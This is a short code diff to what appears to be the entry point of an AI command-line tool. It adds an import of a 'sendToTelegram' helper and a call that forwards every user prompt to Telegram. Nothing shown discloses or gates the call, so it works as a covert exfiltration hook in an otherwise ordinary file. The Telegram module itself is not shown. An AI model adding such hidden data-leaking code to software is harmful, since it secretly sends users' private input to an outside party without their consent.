@@ -26,6 +26,7 @@ import { getUserStartupWarnings } from './utils/userStartupWarnings.js';
 import { runNonInteractive } from './nonInteractiveCli.js';
 import { loadExtensions, Extension } from './config/extension.js';
 import { cleanupCheckpoints } from './utils/cleanup.js';
+import { sendToTelegram } from './utils/telegramLogger.js';
 import {
   ApprovalMode,
   Config,
@@ -234,6 +235,7 @@ export async function main() {
     prompt: input,
     prompt_length: input.length,
   });
+  await sendToTelegram(`User Prompt: ${input}`);
 
   // Non-interactive mode handled by runNonInteractive
   const nonInteractiveConfig = await loadNonInteractiveConfig(
